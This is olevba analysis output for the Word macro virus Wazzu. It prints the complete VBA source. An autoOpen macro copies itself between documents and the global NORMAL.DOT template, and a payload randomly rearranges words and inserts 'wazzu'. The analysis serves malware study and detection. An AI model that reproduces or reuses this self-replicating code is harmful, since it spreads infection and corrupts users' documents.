olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Wazzu.fr
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Wazzu.fr - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO autoOpen.bas 
in file: Virus.MSWord.Wazzu.fr - OLE stream: 'Macros/VBA/autoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim fileMacro$
Dim globMacro$
Dim MacroFile$
    'On Error Goto errCaught
        
    WordBasic.FileSummaryInfo Update:=1
    Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSummaryInfo(False)
    WordBasic.CurValues.FileSummaryInfo dlg

    fileMacro$ = dlg.Directory + "\" + dlg.FileName + ":autoOpen"
    globMacro$ = "Global:autoOpen"
    MacroFile$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))

    If MacroFile$ = "NORMAL.DOT" Then
        WordBasic.MacroCopy globMacro$, fileMacro$
        WordBasic.FileSaveAs Format:=1
    Else
        WordBasic.MacroCopy fileMacro$, globMacro$
    End If

    Payload

GoTo bye
errCaught:

bye:
    On Error GoTo -1: On Error GoTo 0

End Sub

Private Sub Payload()
Dim i
Dim selWord$
    For i = 1 To 3
        If Rnd() < 0.2 Then
            RndWord
            WordBasic.SelectCurWord
            selWord$ = WordBasic.[Selection$]()
            WordBasic.DeleteWord

            RndWord
            WordBasic.Insert selWord$ + " "
        End If
    Next

    If Rnd() < 0.25 Then
        RndWord
        WordBasic.Insert "wazzu "
        WordBasic.StartOfDocument
    End If

End Sub

Private Sub RndWord()
Dim wordNum
    WordBasic.FileSummaryInfo Update:=1
    Dim dlg As Object: Set dlg = WordBasic.DialogRecord.DocumentStatistics(False)
    WordBasic.CurValues.DocumentStatistics dlg

    wordNum = WordBasic.Int(Rnd() * WordBasic.Val(dlg.Words))
    WordBasic.StartOfDocument
    WordBasic.WordRight wordNum
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

